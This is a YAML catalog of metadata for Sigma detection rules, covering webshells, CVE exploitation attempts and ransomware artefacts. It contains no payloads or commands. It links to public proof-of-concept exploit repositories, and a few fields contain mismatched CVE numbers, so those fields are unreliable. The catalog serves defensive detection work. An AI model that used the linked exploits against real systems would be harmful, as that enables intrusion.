- detection_id: fdf96c90-42d5-4406-8a9c-14a2c9a016b5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2021/TA/UNC2546/web_unc2546_dewmode_php_webshell.yml
  name: DEWMODE Webshell Access
  description: Detects access to DEWMODE webshell as described in FIREEYE report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1505.003
  tags:
  - attack.persistence
  - attack.t1505.003
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/accellion-fta-exploited-for-data-theft-and-extortion
  false_positives:
  - Unknown
  notes: ''
- detection_id: 53207cc2-0745-4c19-bc72-80be1cc16b3f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-21554/proc_creation_win_exploit_cve_2023_21554_queuejumper.yml
  name: Potential CVE-2023-21554 QueueJumper Exploitation
  description: Detects potential exploitation of CVE-2023-21554 (dubbed QueueJumper)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.privilege-escalation
  - attack.execution
  - cve.2023-21554
  - detection.emerging-threats
  time_window: ''
  references:
  - https://research.checkpoint.com/2023/queuejumper-critical-unauthorized-rce-vulnerability-in-msmq-service/
  false_positives:
  - Unknown
  notes: ''
- detection_id: d033cb8a-8669-4a8e-a974-48d4185a8503
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-21587/web_cve_2022_21587_oracle_ebs.yml
  name: Potential CVE-2022-21587 Exploitation Attempt
  description: Detects potential exploitation attempts of CVE-2022-21587 an arbitrary
    file upload vulnerability impacting Oracle E-Business Suite (EBS). CVE-2022-21587
    can lead to unauthenticated remote code execution.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_ready
  predictive_readiness_score: 8
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - baseline_or_anomaly_framing
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2022-21587
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.rapid7.com/blog/post/2023/02/07/etr-cve-2022-21587-rapid7-observed-exploitation-of-oracle-e-business-suite-vulnerability/
  - https://attackerkb.com/topics/Bkij5kK1qK/cve-2022-21587/rapid7-analysis
  - https://github.com/hieuminhnv/CVE-2022-21587-POC
  - https://blog.viettelcybersecurity.com/cve-2022-21587-oracle-e-business-suite-unauth-rce/
  false_positives:
  - Vulnerability Scanners
  notes: ''
- detection_id: 52a85084-6989-40c3-8f32-091e12e17692
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-21919/win_system_exploit_cve_2022_21919_or_cve_2021_34484.yml
  name: Potential Exploitation of CVE-2022-21919 or CVE-2021-34484 for LPE
  description: 'Detects potential exploitation attempts of CVE-2022-21919 or CVE-2021-34484
    leading to local privilege escalation via the User Profile Service.

    During exploitation of this vulnerability, two logs (Provider_Name: Microsoft-Windows-User
    Profiles Service) with EventID 1511 and 1515 are created (EventID 1515 may generate
    many false positives).

    Additionally, the directory \Users\TEMP may be created during exploitation. This
    behavior was observed on Windows Server 2008.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: application
  category: ''
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - detection.emerging-threats
  - cve.2022-21919
  - cve.2021-34484
  time_window: ''
  references:
  - https://packetstormsecurity.com/files/166692/Windows-User-Profile-Service-Privlege-Escalation.html
  false_positives:
  - Corrupted user profiles - https://social.technet.microsoft.com/wiki/contents/articles/3571.windows-user-profiles-service-event-1511-windows-cannot-find-the-local-profile-and-is-logging-you-on-with-a-temporary-profile.aspx
  notes: ''
- detection_id: 5660d8db-6e25-411f-b92f-094420168a5d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-22954/proc_creation_win_exploit_cve_2022_22954_vmware_workspace_one_rce.yml
  name: Potential CVE-2022-22954 Exploitation Attempt - VMware Workspace ONE Access
    Remote Code Execution
  description: 'Detects potential exploitation attempt of CVE-2022-22954, a remote
    code execution vulnerability in VMware Workspace ONE Access and Identity Manager.

    As reported by Morphisec, part of the attack chain, threat actors used PowerShell
    commands that executed as a child processes of the legitimate Tomcat "prunsrv.exe"
    process application.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.006
  - T1190
  tags:
  - attack.execution
  - attack.initial-access
  - attack.t1059.006
  - attack.t1190
  - cve.2022-22954
  - detection.emerging-threats
  time_window: ''
  references:
  - https://blog.morphisec.com/vmware-identity-manager-attack-backdoor
  - https://github.com/DrorDvash/CVE-2022-22954_VMware_PoC
  false_positives:
  - Some false positives are possible as part of a custom script implementation from
    admins executed with cmd.exe as the child process.
  notes: ''
- detection_id: e0a41412-c69a-446f-8e6e-0e6d7483dad7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-24527/file_event_win_cve_2022_24527_lpe.yml
  name: CVE-2022-24527 Microsoft Connected Cache LPE
  description: Detects files created during the local privilege exploitation of CVE-2022-24527
    Microsoft Connected Cache
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.privilege-escalation
  - attack.t1059.001
  - cve.2022-24527
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.rapid7.com/blog/post/2022/04/12/cve-2022-24527-microsoft-connected-cache-local-privilege-escalation-fixed/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7fb14105-530e-4e2e-8cfb-99f7d8700b66
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-26134/proc_creation_lnx_exploit_cve_2022_26134_atlassian_confluence.yml
  name: Atlassian Confluence CVE-2022-26134
  description: Detects spawning of suspicious child processes by Atlassian Confluence
    server which may indicate successful exploitation of CVE-2022-26134
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  - T1190
  tags:
  - attack.initial-access
  - attack.execution
  - attack.t1190
  - attack.t1059
  - cve.2022-26134
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.volexity.com/blog/2022/06/02/zero-day-exploitation-of-atlassian-confluence/
  false_positives:
  - Unknown
  notes: ''
- detection_id: a7cd7306-df8b-4398-b711-6f3e4935cf16
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-26809/proc_creation_win_exploit_cve_2022_26809_rpcss_child_process_anomaly.yml
  name: Potential CVE-2022-26809 Exploitation Attempt
  description: Detects suspicious remote procedure call (RPC) service anomalies based
    on the spawned sub processes (long shot to detect the exploitation of vulnerabilities
    like CVE-2022-26809)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1190
  - T1569.002
  tags:
  - attack.initial-access
  - attack.t1190
  - attack.execution
  - attack.t1569.002
  - cve.2022-26809
  - detection.emerging-threats
  time_window: ''
  references:
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26809
  - https://www.bleepingcomputer.com/startups/RpcSs.exe-14544.html
  - https://twitter.com/cyb3rops/status/1514217991034097664
  - https://www.securonix.com/blog/cve-2022-26809-remote-procedure-call-runtime-remote-code-execution-vulnerability-and-coverage/
  false_positives:
  - Unknown
  - Some cases in which the service spawned a werfault.exe process
  notes: ''
- detection_id: dd218fb6-4d02-42dc-85f0-a0a376072efd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-27925/web_cve_2022_27925_exploit.yml
  name: Zimbra Collaboration Suite Email Server Unauthenticated RCE
  description: Detects an attempt to leverage the vulnerable servlet "mboximport"
    for an unauthenticated remote command injection
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2022-27925
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.volexity.com/blog/2022/08/10/mass-exploitation-of-unauthenticated-zimbra-rce-cve-2022-27925/
  - https://www.yang99.top/index.php/archives/82/
  - https://github.com/vnhacker1337/CVE-2022-27925-PoC
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9a4ccd1a-3526-4d99-b980-9f9c5d3a6ee3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-29072/proc_creation_win_exploit_cve_2022_29072_7zip.yml
  name: Potential CVE-2022-29072 Exploitation Attempt
  description: 'Detects potential exploitation attempts of CVE-2022-29072, a 7-Zip
    privilege escalation and command execution vulnerability.

    7-Zip version 21.07 and earlier on Windows allows privilege escalation (CVE-2022-29072)
    and command execution when a file with the .7z extension is dragged to the Help>Contents
    area. This is caused by misconfiguration of 7z.dll and a heap overflow.

    The command runs in a child process under the 7zFM.exe process.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.execution
  - cve.2022-29072
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/kagancapar/CVE-2022-29072
  - https://twitter.com/kagancapar/status/1515219358234161153
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7ba05b43-adad-4c02-b5e9-c8c35cdf9fa8
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-29799/lnx_exploit_cve_2022_27999_cve_2022_27800.yml
  name: Potential Nimbuspwn Exploit CVE-2022-29799 and CVE-2022-27800
  description: 'Detects potential exploitation attempts of Nimbuspwn vulnerabilities
    CVE-2022-29799 and CVE-2022-27800 in Linux systems.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: ''
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.privilege-escalation
  - attack.t1068
  - detection.emerging-threats
  - cve.2022-29799
  - cve.2022-27800
  time_window: ''
  references:
  - https://www.microsoft.com/security/blog/2022/04/26/microsoft-finds-new-elevation-of-privilege-linux-vulnerability-nimbuspwn/
  - https://github.com/Immersive-Labs-Sec/nimbuspwn
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2d9403d5-7927-46b7-8216-37ab7c9ec5e3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-30190/registry_set_exploit_cve_2022_30190_msdt_follina.yml
  name: Suspicious Set Value of MSDT in Registry (CVE-2022-30190)
  description: Detects set value ms-msdt MSProtocol URI scheme in Registry that could
    be an attempt to exploit CVE-2022-30190.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: registry_set
  data_sources: []
  tactics: []
  techniques:
  - T1221
  tags:
  - attack.defense-evasion
  - attack.t1221
  - detection.emerging-threats
  time_window: ''
  references:
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-30190
  - https://msrc-blog.microsoft.com/2022/05/30/guidance-for-cve-2022-30190-microsoft-support-diagnostic-tool-vulnerability/
  false_positives:
  - Unknown
  notes: ''
- detection_id: fcf1101d-07c9-49b2-ad81-7e421ff96d80
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-31656/web_cve_2022_31656_auth_bypass.yml
  name: CVE-2022-31656 VMware Workspace ONE Access Auth Bypass
  description: 'Detects the exploitation of VMware Workspace ONE Access Authentication
    Bypass vulnerability as described in CVE-2022-31656

    VMware Workspace ONE Access, Identity Manager and vRealize Automation contain
    an authentication bypass vulnerability affecting local domain users.

    A malicious actor with network access to the UI may be able to obtain administrative
    access without the need to authenticate.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2022-31656
  - detection.emerging-threats
  time_window: ''
  references:
  - https://petrusviet.medium.com/dancing-on-the-architecture-of-vmware-workspace-one-access-eng-ad592ae1b6dd
  false_positives:
  - Vulnerability scanners
  notes: ''
- detection_id: efdb2003-a922-48aa-8f37-8b80021a9706
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-31659/web_cve_2022_31659_vmware_rce.yml
  name: CVE-2022-31659 VMware Workspace ONE Access RCE
  description: Detects possible exploitation of VMware Workspace ONE Access Admin
    Remote Code Execution vulnerability as described in CVE-2022-31659
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2022-31659
  - detection.emerging-threats
  time_window: ''
  references:
  - https://petrusviet.medium.com/dancing-on-the-architecture-of-vmware-workspace-one-access-eng-ad592ae1b6dd
  false_positives:
  - Vulnerability scanners
  - Legitimate access to the URI
  notes: ''
- detection_id: c8a5f584-cdc8-42cc-8cce-0398e4265de3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-33891/proc_creation_lnx_exploit_cve_2022_33891_spark_shell_command_injection.yml
  name: Apache Spark Shell Command Injection - ProcessCreation
  description: Detects attempts to exploit an apache spark server via CVE-2014-6287
    from a commandline perspective
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: linux
  product: linux
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2022-33891
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/W01fh4cker/cve-2022-33891/blob/fd973b56e78bca8822caa3a2e3cf1b5aff5d0950/cve_2022_33891_poc.py
  - https://sumsec.me/2022/CVE-2022-33891%20Apache%20Spark%20shell%20command%20injection.html
  - https://github.com/apache/spark/pull/36315/files
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1a9a04fd-02d1-465c-abad-d733fd409f9c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-33891/web_cve_2022_33891_spark_shell_command_injection.yml
  name: Apache Spark Shell Command Injection - Weblogs
  description: Detects attempts to exploit an apache spark server via CVE-2014-6287
    from a weblogs perspective
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2022-33891
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/W01fh4cker/cve-2022-33891/blob/fd973b56e78bca8822caa3a2e3cf1b5aff5d0950/cve_2022_33891_poc.py
  - https://sumsec.me/2022/CVE-2022-33891%20Apache%20Spark%20shell%20command%20injection.html
  - https://github.com/apache/spark/pull/36315/files
  false_positives:
  - Web vulnerability scanners
  notes: ''
- detection_id: 65c0a0ab-d675-4441-bd6b-d3db226a2685
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-36804/web_cve_2022_36804_atlassian_bitbucket_command_injection.yml
  name: Atlassian Bitbucket Command Injection Via Archive API
  description: Detects attempts to exploit the Atlassian Bitbucket Command Injection
    CVE-2022-36804
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2022-36804
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/_0xf4n9x_/status/1572052954538192901
  - https://www.rapid7.com/blog/post/2022/09/20/cve-2022-36804-easily-exploitable-vulnerability-in-atlassian-bitbucket-server-and-data-center/
  - https://confluence.atlassian.com/bitbucketserver/bitbucket-server-and-data-center-advisory-2022-08-24-1155489835.html
  - https://blog.assetnote.io/2022/09/14/rce-in-bitbucket-server/
  false_positives:
  - Web vulnerability scanners
  notes: ''
- detection_id: e6f81941-b1cd-4766-87db-9fc156f658ee
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-37966/win_system_exploit_cve_2022_37966_kdcsvc_rc4_downgrade.yml
  name: Potential KDC RC4-HMAC Downgrade Exploit - CVE-2022-37966
  description: Detects the exploitation of a security bypass and elevation of privilege
    vulnerability with Authentication Negotiation by using weak RC4-HMAC negotiation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.privilege-escalation
  - detection.emerging-threats
  - cve.2022-37966
  time_window: ''
  references:
  - https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1ddf4596-1908-43c9-add2-1d2c2fcc4797
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-41082/proxy_cve_2022_36804_exchange_owassrf_exploitation.yml
  name: Potential OWASSRF Exploitation Attempt - Proxy
  description: Detects exploitation attempt of the OWASSRF variant targeting exchange
    servers It uses the OWA endpoint to access the powershell backend endpoint
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/owassrf-exploit-analysis-and-recommendations/
  - https://www.rapid7.com/blog/post/2022/12/21/cve-2022-41080-cve-2022-41082-rapid7-observed-exploitation-of-owassrf-in-exchange-for-rce/
  false_positives:
  - Web vulnerability scanners
  notes: ''
- detection_id: fdd7e904-7304-4616-a46a-e32f917c4be4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-41082/proxy_cve_2022_36804_exchange_owassrf_poc_exploitation.yml
  name: OWASSRF Exploitation Attempt Using Public POC - Proxy
  description: Detects exploitation attempt of the OWASSRF variant targeting exchange
    servers using publicly available POC. It uses the OWA endpoint to access the powershell
    backend endpoint
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: critical
  status: test
  platform: ''
  product: ''
  category: proxy
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/owassrf-exploit-analysis-and-recommendations/
  - https://www.rapid7.com/blog/post/2022/12/21/cve-2022-41080-cve-2022-41082-rapid7-observed-exploitation-of-owassrf-in-exchange-for-rce/
  - https://twitter.com/purp1ew0lf/status/1602989967776808961?s=12&t=OkZJl_ViICeiftVEsohRyw
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 181f49fa-0b21-4665-a98c-a57025ebb8c7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-41082/web_cve_2022_36804_exchange_owassrf_exploitation.yml
  name: Potential OWASSRF Exploitation Attempt - Webserver
  description: Detects exploitation attempt of the OWASSRF variant targeting exchange
    servers It uses the OWA endpoint to access the powershell backend endpoint
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/owassrf-exploit-analysis-and-recommendations/
  - https://www.rapid7.com/blog/post/2022/12/21/cve-2022-41080-cve-2022-41082-rapid7-observed-exploitation-of-owassrf-in-exchange-for-rce/
  false_positives:
  - Web vulnerability scanners
  notes: ''
- detection_id: 92d78c63-5a5c-4c40-9b60-463810ffb082
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-41082/web_cve_2022_36804_exchange_owassrf_poc_exploitation.yml
  name: OWASSRF Exploitation Attempt Using Public POC - Webserver
  description: Detects exploitation attempt of the OWASSRF variant targeting exchange
    servers using publicly available POC. It uses the OWA endpoint to access the powershell
    backend endpoint
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.crowdstrike.com/blog/owassrf-exploit-analysis-and-recommendations/
  - https://www.rapid7.com/blog/post/2022/12/21/cve-2022-41080-cve-2022-41082-rapid7-observed-exploitation-of-owassrf-in-exchange-for-rce/
  - https://twitter.com/purp1ew0lf/status/1602989967776808961?s=12&t=OkZJl_ViICeiftVEsohRyw
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 6d1058a4-407e-4f3a-a144-1968c11dc5c3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-41120/proc_creation_win_exploit_cve_2022_41120_sysmon_eop.yml
  name: Suspicious Sysmon as Execution Parent
  description: Detects suspicious process executions in which Sysmon itself is the
    parent of a process, which could be a sign of exploitation (e.g. CVE-2022-41120)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1068
  tags:
  - attack.privilege-escalation
  - attack.t1068
  - cve.2022-41120
  - detection.emerging-threats
  time_window: ''
  references:
  - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41120
  - https://twitter.com/filip_dragovic/status/1590052248260055041
  - https://twitter.com/filip_dragovic/status/1590104354727436290
  false_positives:
  - Unknown
  notes: ''
- detection_id: 293ccb8c-bed8-4868-8296-bef30e303b7e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-42475/fortios_sslvpnd_exploit_cve_2022_42475_exploitation_indicators.yml
  name: Exploitation Indicator Of CVE-2022-42475
  description: Detects exploitation indicators of CVE-2022-42475 a heap-based buffer
    overflow in sslvpnd.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: fortios
  product: sslvpnd
  category: ''
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.initial-access
  - cve.2022-42475
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.fortiguard.com/psirt/FG-IR-22-398
  - https://www.bleepingcomputer.com/news/security/fortinet-says-ssl-vpn-pre-auth-rce-bug-is-exploited-in-attacks/
  - https://www.deepwatch.com/labs/customer-advisory-fortios-ssl-vpn-vulnerability-cve-2022-42475-exploited-in-the-wild/
  - https://community.fortinet.com/t5/FortiGate/Technical-Tip-Critical-vulnerability-Protect-against-heap-based/ta-p/239420
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1b2eeb27-949b-4704-8bfa-d8e5cfa045a1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-44877/web_cve_2022_44877_exploitation_attempt.yml
  name: Potential Centos Web Panel Exploitation Attempt - CVE-2022-44877
  description: Detects potential exploitation attempts that target the Centos Web
    Panel 7 Unauthenticated Remote Code Execution CVE-2022-44877
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 4
  predictive_readiness_factors:
  - sequence_or_progression_logic
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2022-44877
  - detection.emerging-threats
  time_window: ''
  references:
  - https://seclists.org/fulldisclosure/2023/Jan/1
  - https://www.rapid7.com/blog/post/2023/01/19/etr-exploitation-of-control-web-panel-cve-2022-44877/
  false_positives:
  - Web vulnerability scanners
  notes: ''
- detection_id: 738cb115-881f-4df3-82cc-56ab02fc5192
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Exploits/CVE-2022-46169/web_cve_2022_46169_cacti_exploitation_attempt.yml
  name: Potential CVE-2022-46169 Exploitation Attempt
  description: Detects potential exploitation attempts that target the Cacti Command
    Injection CVE-2022-46169
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2022-46169
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/0xf4n9x/CVE-2022-46169
  - https://github.com/Cacti/cacti/security/advisories/GHSA-6p93-p743-35gf
  - https://github.com/rapid7/metasploit-framework/pull/17407
  false_positives:
  - Web vulnerability scanners
  notes: ''
- detection_id: eee8311f-a752-44f0-bf2f-6b007db16300
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Malware/BlueSky-Ransomware/win_security_malware_bluesky_ransomware_files_indicators.yml
  name: BlueSky Ransomware Artefacts
  description: Detect access to files and shares with names and extensions used by
    BlueSky ransomware which could indicate a current or previous encryption attempt.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1486
  tags:
  - attack.impact
  - attack.t1486
  - detection.emerging-threats
  time_window: ''
  references:
  - https://unit42.paloaltonetworks.com/bluesky-ransomware/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 994cac2b-92c2-44bf-8853-14f6ca39fbda
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2022/Malware/Bumblebee/create_remote_thread_win_malware_bumblebee.yml
  name: Potential Bumblebee Remote Thread Creation
  description: Detects remote thread injection events based on action seen used by
    bumblebee
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: create_remote_thread
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218.011
  - attack.t1059.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://thedfirreport.com/2022/09/26/bumblebee-round-two/
  false_positives:
  - Unknown
  notes: ''
